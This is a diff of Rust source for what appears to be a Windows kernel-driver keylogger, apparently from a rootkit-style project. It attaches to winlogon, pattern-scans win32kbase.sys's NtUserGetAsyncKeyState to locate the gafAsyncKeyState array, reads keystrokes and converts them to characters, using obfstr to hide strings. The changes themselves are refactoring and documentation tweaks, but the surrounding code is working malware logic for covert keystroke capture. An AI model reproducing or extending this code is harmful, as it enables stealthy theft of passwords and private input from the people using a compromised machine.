@@ -1,24 +1,33 @@
 use {
-    keys::VK_CHARS, 
     obfstr::obfstr,
-    shared::structs::Keylogger, 
-    core::{ffi::c_void, mem::size_of}, 
+    keys::VK_CHARS,
+    shared::structs::Keylogger,
+    core::{ffi::c_void, mem::size_of},
     crate::{
-        get_ks_byte, get_ks_down_bit, includes::MmCopyVirtualMemory, 
-        is_key_down, process::Process, set_key_down, 
+        get_ks_byte, 
+        get_ks_down_bit, 
+        is_key_down, 
+        set_key_down,
+        process::Process,
+        internals::externs::MmCopyVirtualMemory,
         utils::{
-            address::{get_address_asynckey, get_module_base_address}, 
-            get_process_by_name, patterns::scan_for_pattern, 
-            process_attach::ProcessAttach
-        }
-    }, 
+            address::{get_address_asynckey, get_module_base_address},
+            get_process_by_name, 
+            patterns::scan_for_pattern,
+            process_attach::ProcessAttach,
+        },
+    },
     wdk_sys::{
         ntddk::{
-            IoGetCurrentProcess, KeDelayExecutionThread,
+            IoGetCurrentProcess, 
+            KeDelayExecutionThread,
             PsTerminateSystemThread,
         },
-        LARGE_INTEGER, NTSTATUS, STATUS_SUCCESS, _MODE::KernelMode,
-    }
+        LARGE_INTEGER, 
+        NTSTATUS, 
+        STATUS_SUCCESS, 
+        _MODE::KernelMode,
+    },
 };
 
 pub mod macros;
@@ -44,10 +53,12 @@ static mut KEY_RECENT: [u8; 64] = [0; 64];
 /// Converts a virtual key code to a character.
 ///
 /// # Parameters
+/// 
 /// - `key`: The code for the virtual key.
 ///
 /// # Returns
-/// `&'static str`: A string representing the character corresponding to the code of the virtual key.
+/// 
+/// - `&'static str`: A string representing the character corresponding to the code of the virtual key.
 /// 
 fn vk_to_char(key: u8) -> &'static str {
     for &(vk, char) in &VK_CHARS {
@@ -61,6 +72,7 @@ fn vk_to_char(key: u8) -> &'static str {
 /// Updates the status of the keys.
 ///
 /// # Parameters
+/// 
 /// - `address`: Array address `gafAsyncKeyState`.
 ///
 unsafe fn update_key_state(address: *mut u8) {
@@ -97,6 +109,7 @@ unsafe fn update_key_state(address: *mut u8) {
 /// Starts the Winlogon process.
 ///
 /// # Returns
+/// 
 /// - `bool`: if the Winlogon process was successfully initialized, otherwise `false`.
 ///
 unsafe fn initialize_winlogon_process() -> bool {
@@ -116,9 +129,11 @@ unsafe fn initialize_winlogon_process() -> bool {
 /// Checks if a key has been pressed.
 ///
 /// # Parameters
+/// 
 /// - `key`: The key code.
 ///
 /// # Returns
+/// 
 /// - `bool`: if the key was pressed, otherwise `false`.
 ///
 unsafe fn key_pressed(key: u8) -> bool {
@@ -130,6 +145,7 @@ unsafe fn key_pressed(key: u8) -> bool {
 /// The keylogger's main function.
 ///
 /// # Parameters
+/// 
 /// - `_address`: Function address (Is not used).
 ///
 pub unsafe extern "C" fn keylogger(_address: *mut c_void) {
@@ -164,6 +180,7 @@ pub unsafe extern "C" fn keylogger(_address: *mut c_void) {
 /// Get the address of the `gafAsyncKeyState` array.
 ///
 /// # Returns
+/// 
 /// `Option<PVOID>`: The address of the `gafAsyncKeyState` array if found, otherwise `None`.
 ///
 unsafe fn get_gafasynckeystate_address() -> Option<*mut u8> {
@@ -175,15 +192,14 @@ unsafe fn get_gafasynckeystate_address() -> Option<*mut u8> {
 
     let module_address = get_module_base_address(obfstr!("win32kbase.sys"))?;
     let function_address = get_address_asynckey(obfstr!("NtUserGetAsyncKeyState"), module_address)?;
-    let function_bytes = core::slice::from_raw_parts(function_address as *const u8, 200);
 
     let attach_process = ProcessAttach::new(winlogon_eprocess.e_process);
 
     // fffff4e1`18e41bae 48 8b 05 0b 4d 20 00  mov rax,qword ptr [win32kbase!gafAsyncKeyState (fffff4e1`190468c0)]
     // fffff4e1`18e41bb5 48 89 81 80 00 00 00  mov qword ptr [rcx+80h],rax
-    let instructions = [0x48, 0x8B, 0x05];
+    let pattern = [0x48, 0x8B, 0x05];
 
-    scan_for_pattern(function_address, &instructions, 3, 7, 0x200, u32::from_le_bytes)
+    scan_for_pattern(function_address, &pattern, 3, 7, 0x200, u32::from_le_bytes)
 }
 
 /// Sets the keylogger status.
